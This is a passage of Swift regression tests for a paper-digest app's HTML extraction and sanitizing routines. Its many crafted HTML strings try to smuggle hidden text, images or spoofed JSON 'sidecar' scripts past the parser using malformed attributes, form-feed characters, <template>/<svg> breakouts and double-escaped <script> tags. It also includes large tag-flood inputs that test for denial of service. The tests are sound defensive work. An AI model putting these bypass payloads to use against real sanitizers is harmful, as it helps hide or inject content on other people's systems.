                "<div hidden/><p>SECRET</p></div>",
                "<a href=\"https://example.com/a\" hidden/>SECRET</a>",
                "<div hidden /><p>SECRET</p></div>",
                "<div hidden id=\"x\"/><p>SECRET</p></div>",
                "<div hidden id=x/><p>SECRET</p></div>",
                "<div hidden=1/><p>SECRET</p></div>",
                "<div hidden=/><p>SECRET</p></div>"
            ] {
                var rejected = false
                do { try LibraryService.verifySafeDesktopArticleHTML(badSelfClose) } catch { rejected = true }
                try require(rejected, "Wave 6 R15 #1: verifySafeDesktopArticleHTML must reject \(badSelfClose)")
            }
            try LibraryService.verifySafeDesktopArticleHTML("<img src=\"https://example.com/ok.png\" hidden /><br/><hr/><math><mspace width=\"1em\"/></math>")
            // R15 #2 & #3: HTML5 elements stripped by libtidy preserve @hidden across extractArticle/extractAggregateHTML/desktop,
            // <template> stays inert, and ancestor-or-self @hidden on #article-body is blocked.
            do {
                let samplePaper = LibraryService.Paper(
                    id: "arxiv:2611.99999",
                    title: "R15 Test Paper",
                    titleZh: "R15 测试",
                    authors: ["Test Author"],
                    date: "2026-11-20",
                    score: 7.5,
                    task: "音频",
                    method: "方法",
                    tags: [],
                    sourceKind: "arxiv",
                    identityStatus: "unverified",
                    pageType: "paper",
                    blogURL: "https://nanless.github.io/audio-paper-digest-blog/posts/2026-11-20-r15-test/",
                    sourceURL: "https://arxiv.org/abs/2611.99999",
                    pdfURL: "https://arxiv.org/pdf/2611.99999.pdf",
                    sourceVersion: "2611.99999v1",
                    appearances: [],
                    citation: .object([:])
                )
                let sampleURL = URL(string: samplePaper.blogURL)!
                for tag in ["section", "article", "main", "aside", "header", "footer", "nav", "mark", "time", "picture", "audio", "video", "svg", "dialog"] {
                    let html = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>VISIBLE</p><\(tag) hidden><p>SECRET</p><table><tr><td>TBLSECRET</td></tr></table><img src=\"https://example.com/secret.png\"/></\(tag)></div></body></html>"
                    let extracted = try LibraryService.extractArticle(html, paper: samplePaper, pageURL: sampleURL)
                    try require(extracted.plainText.contains("VISIBLE"), "Wave 6 R15 #2: extractArticle keeps visible text with <\(tag) hidden>")
                    try require(!extracted.plainText.contains("SECRET") && !extracted.plainText.contains("TBLSECRET"), "Wave 6 R15 #2: extractArticle must drop hidden <\(tag)> text")
                    try require(extracted.resources.isEmpty, "Wave 6 R15 #2: extractArticle must drop hidden <\(tag)> images")
                }
                let tplHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>VISIBLE</p><template></div><script>var x=\"</template>\";</script><p>TPLSECRET</p><img src=\"https://example.com/tpl.png\"/></template></div></body></html>"
                let tplExtracted = try LibraryService.extractArticle(tplHTML, paper: samplePaper, pageURL: sampleURL)
                try require(tplExtracted.plainText.contains("VISIBLE") && !tplExtracted.plainText.contains("TPLSECRET") && tplExtracted.resources.isEmpty, "Wave 6 R15 #2: <template> must remain inert in extractArticle")
                for hiddenBodyHTML in [
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\" hidden><p>SECRET</p></div></body></html>",
                    "<!doctype html><html><body><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section></body></html>"
                ] {
                    var rejected = false
                    do { _ = try LibraryService.extractArticle(hiddenBodyHTML, paper: samplePaper, pageURL: sampleURL) } catch { rejected = true }
                    try require(rejected, "Wave 6 R15 #3: extractArticle must reject hidden #article-body or hidden ancestor")
                }
                // Aggregate HTML: hidden <figure> and hidden #article-body
                let aggBase = "https://nanless.github.io/audio-paper-digest-blog/"
                let aggURL = URL(string: aggBase + "posts/2026-11-20/")!
                let aggDesc = PublishedAggregate(
                    id: "daily:2026-11-20",
                    kind: .daily,
                    conferenceScope: nil,
                    title: "2026-11-20",
                    titleZh: "日更",
                    summary: "",
                    rawDate: "2026-11-20",
                    displayDate: "2026-11-20",
                    categories: [],
                    tags: [],
                    sourceURL: aggURL.absoluteString,
                    source: .init(
                        manifestSHA256: String(repeating: "a", count: 64),
                        shardSHA256: String(repeating: "b", count: 64),
                        shardBytes: 128,
                        shardURL: aggBase + "search-index/part-0001.json",
                        rowIndex: 0,
                        normalizedRowSHA256: String(repeating: "c", count: 64),
                        normalizedRowAlgorithm: "sha256"
                    )
                )
                let aggHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>AGG_OK</p><figure hidden><p>AGG_SECRET</p><img src=\"https://example.com/agg-secret.png\"/></figure><aside hidden><p>ASIDE_SECRET</p></aside></div></body></html>"
                let aggDoc = try LibraryService.extractAggregateHTML(Data(aggHTML.utf8), descriptor: aggDesc, responseURL: aggURL, fetchedAt: "2026-11-20T00:00:00Z")
                try require(aggDoc.plainText.contains("AGG_OK") && !aggDoc.plainText.contains("AGG_SECRET") && !aggDoc.plainText.contains("ASIDE_SECRET") && aggDoc.resources.isEmpty, "Wave 6 R15 #2: extractAggregateHTML must drop hidden <figure>/<aside>")
                var aggHiddenRejected = false
                let aggHiddenHTML = "<!doctype html><html><body><div hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>"
                do { _ = try LibraryService.extractAggregateHTML(Data(aggHiddenHTML.utf8), descriptor: aggDesc, responseURL: aggURL, fetchedAt: "2026-11-20T00:00:00Z") } catch { aggHiddenRejected = true }
                try require(aggHiddenRejected, "Wave 6 R15 #3: extractAggregateHTML must reject hidden #article-body ancestor")
                // R15 #4: scanHTML5ByteTag must not hang on truncated UTF-8 at exact EOF (limit == n)
                let truncBytes = Array("</div ".utf8) + [UInt8(0xE2), UInt8(0x80)]
                let truncRes = LibraryService.scanHTML5ByteTag(truncBytes, at: 0)
                let truncFailedClosed: Bool
                if case .unquotedLessThan = truncRes { truncFailedClosed = true } else { truncFailedClosed = false }
                try require(truncFailedClosed, "Wave 6 R15 #4: truncated UTF-8 at exact EOF must fail closed")

                // R16 #1: O(n) per-tag stacks (no O(n^2) DoS) + cross-nesting preservation
                let tStart = Date()
                let dosInput = String(repeating: "<time>", count: 15_000) + String(repeating: "</mark>", count: 15_000)
                _ = LibraryService.rewriteHTML5TagsForTidy(
                    dosInput,
                    tagMarker: "data-r16-test",
                    preserveTags: [],
                    containerTags: LibraryService.html5BlockContainerTags,
                    inlineContainerTags: LibraryService.html5InlineContainerTags
                )
                try require(Date().timeIntervalSince(tStart) < 1.0, "Wave 6 R16 #1: rewriteHTML5TagsForTidy must run in linear time (<1s for 30k tags)")
                let crossNestHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><mark><time hidden><p>IN</p></mark><p>HID</p></time><p>VISIBLE_AFTER</p></div></body></html>"
                let crossExtracted = try LibraryService.extractArticle(crossNestHTML, paper: samplePaper, pageURL: sampleURL)
                try require(crossExtracted.plainText.contains("OK") && crossExtracted.plainText.contains("VISIBLE_AFTER") && !crossExtracted.plainText.contains("IN") && !crossExtracted.plainText.contains("HID"), "Wave 6 R16 #1: cross-nested <mark><time hidden> must preserve VISIBLE_AFTER and drop hidden text")

                // R16 #2 & #3: verifySafeDesktopArticleHTML rejects all C0/DEL controls and out-of-<math> MathML tags / hidden MathML
                for badR16Frag in [
                    "<p>OK</p><div hidden id=x/\u{0001}><p>SECRET</p></div>",
                    "<p>OK</p><div hidden=1/\u{000C}><p>SECRET</p></div>",
                    "<p>OK</p><div id=x\u{000C}hidden><p>SECRET</p></div>",
                    "<p>OK</p><div hidden>\u{007F}</div>",
                    "<p>OK</p><mrow hidden><p>SECRET</p></mrow>",
                    "<p>OK</p><mtext hidden /><p>SECRET</p></mtext>",
                    "<p>OK</p><mtable hidden><p>SECRET</p></mtable>",
                    "<p>OK</p><math hidden><mi>x</mi></math>",
                    "<p>OK</p><math><mi>x</mi>"
                ] {
                    var rej = false
                    do { try LibraryService.verifySafeDesktopArticleHTML(badR16Frag) } catch { rej = true }
                    try require(rej, "Wave 6 R16 #2/#3: verifySafeDesktopArticleHTML must reject \(badR16Frag)")
                }

                // R16 #4 & #5: HTML4-vs-HTML5 content-model differentials, unlisted/custom tags, self-closing/slash/\f, and malformed attr @hidden
                for hiddenLeakBody in [
                    "<p>OK</p><a hidden><p>SECRET</p><img src=\"https://example.com/secret.png\"/></a>",
                    "<p>OK</p><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><ruby hidden><table><tr><td>SECRET</td></tr></table></ruby>",
                    "<p>OK</p><table><caption hidden><p>SECRET</p></caption><tr><td>OK2</td></tr></table>",
                    "<p>OK</p><dl><dt hidden><div>SECRET</div></dt><dd>OK2</dd></dl>",
                    "<p>OK</p><pre hidden><div>SECRET</div></pre>",
                    "<p>OK</p><h1 hidden><p>SECRET</p></h1>",
                    "<p>OK</p><my-spoiler hidden><p>SECRET</p><img src=\"https://example.com/secret.png\"/></my-spoiler>",
                    "<p>OK</p><portal hidden><p>SECRET</p></portal>",
                    "<p>OK</p><fencedframe hidden><p>SECRET</p></fencedframe>",
                    "<p>OK</p><selectedcontent hidden><p>SECRET</p></selectedcontent>",
                    "<p>OK</p><mrow hidden><p>SECRET</p></mrow>",
                    "<p>OK</p><div hidden/>SECRET</div>",
                    "<p>OK</p><div hidden />SECRET</div>",
                    "<p>OK</p><div hidden id=\"x\"/>SECRET</div>",
                    "<p>OK</p><div hidden id=x/>SECRET</div>",
                    "<p>OK</p><p hidden/class=\"x\">SECRET</p>",
                    "<p>OK</p><figure/hidden><p>SECRET</p></figure>",
                    "<p>OK</p><section/hidden><p>SECRET</p></section>",
                    "<p>OK</p><time/hidden><p>SECRET</p></time>",
                    "<p>OK</p><p hidden\u{000C}class=\"x\">SECRET</p>",
                    "<p>OK</p><section\u{000C}hidden><p>SECRET</p></section>",
                    "<p>OK</p><div id=x\u{000C}hidden><p>SECRET</p></div>",
                    "<p>OK</p><time =hidden><table><tr><td>SECRET</td></tr></table></time>",
                    "<p>OK</p><time \"hidden><table><tr><td>SECRET</td></tr></table></time>",
                    "<p>OK</p><time a \"x=\" hidden><table><tr><td>SECRET</td></tr></table></time>",
                    "<p>OK</p><time a-\"x=\" hidden><table><tr><td>SECRET</td></tr></table></time>"
                ] {
                    let fullHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(hiddenLeakBody)</div></body></html>"
                    let ext = try LibraryService.extractArticle(fullHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(ext.plainText.contains("OK") && !ext.plainText.contains("SECRET") && ext.resources.isEmpty, "Wave 6 R16 #4/#5: extractArticle leaked hidden payload for \(hiddenLeakBody)")
                    let agg = try LibraryService.extractAggregateHTML(Data(fullHTML.utf8), descriptor: aggDesc, responseURL: aggURL, fetchedAt: "2026-11-20T00:00:00Z")
                    try require(agg.plainText.contains("OK") && !agg.plainText.contains("SECRET") && agg.resources.isEmpty, "Wave 6 R16 #4/#5: extractAggregateHTML leaked hidden payload for \(hiddenLeakBody)")
                }

                // R16 #6: <template> stays inert across self-closing rawtext/RCDATA/plaintext, <noscript>, and foreign <math>/<svg>
                for tplLeak in [
                    "<template><script/>var s=\"</template><p>SECRET</p><img src='https://example.com/secret.png'/>\";</script></template>",
                    "<template><textarea/></template><p>SECRET</p></textarea></template>",
                    "<template><style/>/*</template><p>SECRET</p>*/</style></template>",
                    "<template><plaintext/></template><p>SECRET</p></template>",
                    "<template><noscript></template><p>SECRET</p></noscript></template>",
                    "<template><math><script><!-- </script></template><p>SECRET</p> --></script></math></template>",
                    "<template><svg><script><!-- </script></template><p>SECRET</p> --></script></svg></template>"
                ] {
                    let fullHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p>\(tplLeak)</div></body></html>"
                    let ext = try LibraryService.extractArticle(fullHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(ext.plainText.contains("OK") && !ext.plainText.contains("SECRET") && ext.resources.isEmpty, "Wave 6 R16 #6: <template> leaked payload for \(tplLeak)")
                }
                // Per WHATWG §13.2.6.5 -> "in template", `</template>` inside `<template><svg><desc>` DOES close `<template>`.
                let tplForeignCloseHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><template><svg><desc></template><p>VISIBLE_AFTER</p></desc></svg></template></div></body></html>"
                let tplForeignCloseExt = try LibraryService.extractArticle(tplForeignCloseHTML, paper: samplePaper, pageURL: sampleURL)
                try require(tplForeignCloseExt.plainText.contains("OK") && tplForeignCloseExt.plainText.contains("VISIBLE_AFTER"), "Wave 6 R19 #6: </template> inside <template><svg><desc> must close <template> per WHATWG §13.2.6.5")

                // R16 #7: tidyHTMLDocumentSafely strips <template> scripts while keeping top-level client-sidecars,
                // and validatePublishedPageIdentity rejects ancestor-or-self @hidden on #article-body
                let tplMetaDoc = try LibraryService.tidyHTMLDocumentSafely("<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></body></html>")
                try require((try tplMetaDoc.nodes(forXPath: "//script[contains(@class,'paper-tools__client-sidecars')]")).isEmpty, "Wave 6 R16 #7: tidyHTMLDocumentSafely must strip inert <template> scripts")
                let liveMetaDoc = try LibraryService.tidyHTMLDocumentSafely("<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></body></html>")
                try require((try liveMetaDoc.nodes(forXPath: "//script[contains(@class,'paper-tools__client-sidecars')]")).count == 1, "Wave 6 R16 #7: tidyHTMLDocumentSafely must keep real top-level client-sidecars script")
                let hiddenIdDoc = try LibraryService.tidyHTMLDocumentSafely("<!doctype html><html><body><section hidden><div id=\"article-body\" class=\"post-content\"><p>OK</p></div></section></body></html>")
                var hiddenIdRejected = false
                do { try LibraryService.validatePublishedPageIdentity(hiddenIdDoc, paper: samplePaper) } catch { hiddenIdRejected = true }
                try require(hiddenIdRejected, "Wave 6 R16 #7: validatePublishedPageIdentity must reject hidden #article-body ancestor")

                // Wave 6 R17: All 9 live-verified regressions
                // R17 #1 & #2: tidyHTMLDocumentSafely & extractArticle/extractAggregateHTML fail closed on abort triggers, <math> suppression, and <template><svg><script>
                for badTidy in [
                    "<!doctype html><html><body><div a=<></div><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></body></html>",
                    "<!doctype html><html><body><![a]></div><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div\u{013E}><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></body></html>",
                    "<!doctype html><html><body><math><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></math></body></html>",
                    "<!doctype html><html><body><math><section hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section><template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"x\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><section hidden><p>SECRET</p></section><template><svg><script><div a=<></script></svg></template></div></body></html>"
                ] {
                    var tidyThrew = false
                    do { _ = try LibraryService.tidyHTMLDocumentSafely(badTidy) } catch { tidyThrew = true }
                    try require(tidyThrew, "Wave 6 R17 #1/#2: tidyHTMLDocumentSafely must fail closed for \(badTidy.prefix(80))")
                    var extThrew = false
                    do { _ = try LibraryService.extractArticle(badTidy, paper: samplePaper, pageURL: sampleURL) } catch { extThrew = true }
                    try require(extThrew, "Wave 6 R17 #1/#2: extractArticle must fail closed for \(badTidy.prefix(80))")
                }

                // R17 #3, #4, #5, #6, #7, #8: unmatched closing tags, stray </div>, <p hidden>, 0x0C, quote-as-equals, foreign breakout, <script> double-escaped, <xmp>/<plaintext>, nested <dl>, <noframes>/<frameset>/<title>
                for r17LeakBody in [
                    "<p>OK</p><div hidden></section><p>SECRET</p><img src=\"https://example.com/secret.png\"/></div>",
                    "<p>OK</p><div hidden></figure><p>SECRET</p><img src=\"https://example.com/secret.png\"/></div>",
                    "<p>OK</p><section hidden></div><p>SECRET</p><img src=\"https://example.com/secret.png\"/></section>",
                    "<p>OK</p><table><tr><td hidden></div>SECRET<img src=\"https://example.com/secret.png\"/></td></tr></table>",
                    "<p>OK</p><p hidden><span hidden>A</span>SECRET<img src=\"https://example.com/secret.png\"/></p>",
                    "<p>OK</p><p hidden><b hidden>A</b>SECRET</p>",
                    "<p>OK</p><p hidden><picture><img src=\"https://example.com/secret.png\"/>SECRET</picture></p>",
                    "<p>OK</p><p hidden><audio>SECRET</audio></p>",
                    "<p>OK</p><p hidden><video>SECRET</video></p>",
                    "<p>OK</p><p hidden><canvas>SECRET</canvas></p>",
                    "<p>OK</p><p hidden><caption>SECRET</caption></p>",
                    "<p>OK</p><p hidden><td>SECRET</td></p>",
                    "<p>OK</p><section\u{000C}class=\"x\" hidden><p>SECRET</p><img src=\"https://example.com/secret.png\"/></section>",
                    "<p>OK</p><p\u{000C}class=\"x\" hidden>SECRET</p>",
                    "<p>OK</p><section\u{000C}=\"x\" hidden><p>SECRET</p></section>",
                    "<p>OK</p><template\u{000C}id=\"x\"><p>SECRET</p><img src=\"https://example.com/secret.png\"/></template>",
                    "<p>OK</p><script\u{000C}id=\"x\"><p>SECRET</p><img src=\"https://example.com/secret.png\"/></script>",
                    "<p>OK</p><style\u{000C}id=\"x\"><p>SECRET</p></style>",
                    "<p>OK</p><span! hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><time! hidden><table><tr><td>SECRET</td></tr></table></time>",
                    "<p>OK</p><span a \"\"x\"hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><span a \" \"x=1\"hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><time a-\"\"x\"hidden><table><tr><td>SECRET</td></tr></table></time>",
                    "<p>OK</p><template><svg><p><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/secret.png'/>\";</script></p></template>",
                    "<p>OK</p><template><math><p><script>var s=\"</math></template><p>SECRET</p><img src='https://example.com/secret.png'/>\";</script></p></template>",
                    "<p>OK</p><template><script><!-- <script></script></template><p>SECRET</p><img src='https://example.com/secret.png'/> --></script></template>",
                    "<p>OK</p><script><!-- <script></script><p>SECRET</p><img src='https://example.com/secret.png'/> --></script>",
                    "<p>OK</p><xmp/hidden>SECRET</xmp>",
                    "<p>OK</p><xmp hidden/>SECRET</xmp>",
                    "<p>OK</p><xmp hidden\u{000C}class=\"x\">SECRET</xmp>",
                    "<p>OK</p><plaintext/hidden>SECRET",
                    "<p>OK</p><plaintext hidden/>SECRET",
                    "<p>OK</p><plaintext hidden\u{000C}class=\"x\">SECRET",
                    "<p>OK</p><dl><dt hidden>HID1<dl><dd>SECRET</dd></dl>SECRET2</dt><dd>OK2</dd></dl>",
                    "<p>OK</p><dl hidden><title>x</title>SECRET</dl>"
                ] {
                    let fullHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(r17LeakBody)</div></body></html>"
                    let ext = try LibraryService.extractArticle(fullHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(ext.plainText.contains("OK") && !ext.plainText.contains("SECRET") && ext.resources.isEmpty, "Wave 6 R17: extractArticle leaked hidden payload for \(r17LeakBody)")
                    let agg = try LibraryService.extractAggregateHTML(Data(fullHTML.utf8), descriptor: aggDesc, responseURL: aggURL, fetchedAt: "2026-11-20T00:00:00Z")
                    try require(agg.plainText.contains("OK") && !agg.plainText.contains("SECRET") && agg.resources.isEmpty, "Wave 6 R17: extractAggregateHTML leaked hidden payload for \(r17LeakBody)")
                }

                // R17 #3, #5, #8: hidden #article-body wrapper escapes must all be rejected
                for hiddenBodyDoc in [
                    "<!doctype html><html><body><section hidden></article><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></section></body></html>",
                    "<!doctype html><html><body><div\u{000C}class=\"x\" hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div hidden><noframes>x</noframes><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div hidden><p>x</p><frameset></frameset><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><html hidden></body></html>"
                ] {
                    var rejected = false
                    do { _ = try LibraryService.extractArticle(hiddenBodyDoc, paper: samplePaper, pageURL: sampleURL) } catch { rejected = true }
                    try require(rejected, "Wave 6 R17: extractArticle must reject hidden #article-body escape: \(hiddenBodyDoc)")
                }

                // R17 #6 + R18 #4: visible page with 'hidden' strictly inside a quoted value must NOT be falsely rejected,
                // whereas `a " "x hidden y"` carries a real WHATWG HTML5 boolean `hidden` attribute and MUST be rejected.
                let visibleQuoteEq = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\" a \" \"x=\"hidden\"><p>VISIBLE</p></div></body></html>"
                let visExt = try LibraryService.extractArticle(visibleQuoteEq, paper: samplePaper, pageURL: sampleURL)
                try require(visExt.plainText.contains("VISIBLE"), "Wave 6 R17 #6 + R18 #4: visible page with quoted 'hidden' value must not be falsely rejected")
                var whatwgHiddenRejected = false
                do { _ = try LibraryService.extractArticle("<!doctype html><html><body><div id=\"article-body\" class=\"post-content\" a \" \"x hidden y\"><p>SECRET</p></div></body></html>", paper: samplePaper, pageURL: sampleURL) } catch { whatwgHiddenRejected = true }
                try require(whatwgHiddenRejected, "Wave 6 R18 #4: `a \" \"x hidden y\"` has real WHATWG HTML5 boolean `hidden` and must be rejected")

                // R17 #7: double-escaped <script> must not smuggle client-sidecars in tidyHTMLDocumentSafely
                let dblEscSidecar = try LibraryService.tidyHTMLDocumentSafely("<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script><!-- <script></script><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script> --></script></body></html>")
                try require((try dblEscSidecar.nodes(forXPath: "//script[contains(@class,'paper-tools__client-sidecars')]")).isEmpty, "Wave 6 R17 #7: double-escaped <script> must not smuggle client-sidecars")

                // R17 #9: matched 30_000 <time> + </time> must be linear O(n) (no CoW O(n^2) blowup)
                let matchedStart = Date()
                let matched30k = try LibraryService.rewriteHTML5TagsForTidyStrict(
                    String(repeating: "<time>", count: 30_000) + String(repeating: "</time>", count: 30_000),
                    tagMarker: "data-m",
                    preserveTags: [],
                    containerTags: LibraryService.html5BlockContainerTags,
                    inlineContainerTags: LibraryService.html5InlineContainerTags
                )
                try require(!matched30k.isEmpty && Date().timeIntervalSince(matchedStart) < 1.0, "Wave 6 R17 #9: matched 30k <time>+</time> must run in O(n) under 1s")

                // Wave 6 R18 regressions (#1..#10)
                for r18LeakBody in [
                    // R18 #1: divScopeStack / table / object / rewritten inner div unwind
                    "<p>OK</p><table><tr><td><div>A<td>B</table><section hidden></div><p>SECRET</p><img src=\"https://example.com/s.png\"/></section>",
                    "<p>OK</p><div><table><tr><td>A</td></td><section hidden></div><p>SECRET</p><img src=\"https://example.com/s.png\"/></section></tr></table></div>",
                    "<p>OK</p><table><tr><td><section><div><p>A</p></section><section hidden></div><p>SECRET</p><img src=\"https://example.com/s.png\"/></section></td></tr></table>",
                    "<p>OK</p><div><object><section hidden></div><p>SECRET</p></section></object></div>",
                    // R18 #2: 0x0C with quoted '>' in tag attributes
                    "<p>OK</p><section\u{000C}title=\"a>b\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></section>",
                    "<p>OK</p><div a=1\u{000C}b=\"x>y\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><template\u{000C}title=\"a></template>b\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></template>",
                    "<p>OK</p><script\u{000C}title=\"a></script>b\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></script>",
                    "<p>OK</p><textarea\u{000C}title=\"a></textarea>b\"><p>SECRET</p></textarea>",
                    "<p>OK</p><xmp\u{000C}title=\"a></xmp>b\" hidden><p>SECRET</p></xmp>",
                    "<p>OK</p><iframe\u{000C}title=\"a></iframe>b\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></iframe>",
                    // R18 #3: <template> foreign integration points & </p></br> breakout end tags
                    "<p>OK</p><template><svg><foreignObject><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></foreignObject></svg></template>",
                    "<p>OK</p><template><svg><desc><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></desc></svg></template>",
                    "<p>OK</p><template><math><mtext><script>var s=\"</math></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></mtext></math></template>",
                    "<p>OK</p><template><svg></p><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></svg></template>",
                    "<p>OK</p><template><svg></br><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></svg></template>",
                    // R18 #4: WHATWG HTML5 @hidden with a " hidden, -" hidden, !hidden
                    "<p>OK</p><div a \" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><section a \" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></section>",
                    "<p>OK</p><div a ' hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div -\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div -' hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div a-\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><span!hidden><table><tr><td>SECRET</td></tr></table></span>",
                    // R18 #5: <option>, <optgroup>, <frame> inside <td hidden>
                    "<p>OK</p><table><tr><td hidden><option>A</option><p>SECRET</p></td></tr></table>",
                    "<p>OK</p><table><tr><td hidden><optgroup>A</optgroup><p>SECRET</p></td></tr></table>",
                    "<p>OK</p><table><tr><td hidden><frame><p>SECRET</p></td></tr></table>",
                    // R18 #6: <dl hidden><li> & <p hidden> non-closing tags
                    "<p>OK</p><dl hidden><li>A</li><p>SECRET</p></dl>",
                    "<p>OK</p><p hidden><area>SECRET</p>",
                    "<p>OK</p><p hidden><isindex>SECRET</p>",
                    "<p>OK</p><p hidden><layer>A</layer>SECRET</p>",
                    "<p>OK</p><p hidden><multicol>A</multicol>SECRET</p>",
                    "<p>OK</p><p hidden><head></head>SECRET</p>",
                    "<p>OK</p><p hidden><html></html>SECRET</p>",
                    "<p>OK</p><p hidden><body></body>SECRET</p>",
                    "<p>OK</p><p hidden>A</body>SECRET</p>",
                    "<p>OK</p><p hidden>A</html>SECRET</p>",
                    // R18 #7: 0x0C double-escaped <script> & non-WHATWG </script!>
                    "<p>OK</p><script><!-- <script\u{000C}x></script><p>SECRET</p><img src='https://example.com/s.png'/> --></script>",
                    "<p>OK</p><script>var s=\"</script!><p>SECRET</p><img src='https://example.com/s.png'/>\";</script>"
                ] {
                    let fullHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(r18LeakBody)</div></body></html>"
                    let ext = try LibraryService.extractArticle(fullHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(ext.plainText.contains("OK") && !ext.plainText.contains("SECRET") && ext.resources.isEmpty, "Wave 6 R18: extractArticle leaked hidden payload for \(r18LeakBody)")
                }

                // R18 #2, #3, #7: sidecar smuggling blocked in tidyHTMLDocumentSafely
                for r18SidecarDoc in [
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template\u{000C}title=\"a></template>b\"><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script\u{000C}title=\"a></script>b\"><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></script></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template><svg><foreignObject><script>var s=\"</svg></template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script>\";</script></foreignObject></svg></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template><math><mtext><script>var s=\"</math></template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script>\";</script></mtext></math></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template><svg></p><script>var s=\"</svg></template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script>\";</script></svg></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script><!-- <script\u{000C}x></script><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script> --></script></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script>var s=\"</script!><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script>\";</script></body></html>"
                ] {
                    let tdoc = try LibraryService.tidyHTMLDocumentSafely(r18SidecarDoc)
